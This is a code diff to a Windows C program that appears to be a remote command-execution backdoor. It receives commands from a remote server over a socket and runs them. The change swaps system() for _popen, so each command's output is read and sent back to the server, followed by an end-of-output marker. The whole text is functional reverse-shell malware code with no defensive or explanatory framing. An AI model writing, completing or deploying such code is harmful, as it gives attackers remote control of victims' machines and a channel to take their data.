@@ -15,6 +15,7 @@ int main()
     struct sockaddr_in server;
     int recv_commands;
     char command[1024];
+    char output[1024];
     
     if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
     {
@@ -56,8 +57,22 @@ int main()
         }
 
         command[recv_commands] = '\0';
-        system(command);
+        FILE *f = _popen(command, "r");
+        if(f == NULL)
+        {
+            return 1;
+        }
+         while(fgets(output, sizeof(output), f) != 0)
+         {
+            printf("[DEBUG] Sending: %s", output);
+            send(s,output, strlen(output), 0);
+         }
+         _pclose(f);
+         send(s, "END_OF_OUTPUT\n", 14, 0);
+
     }
+
+
 
     return 0;
 }
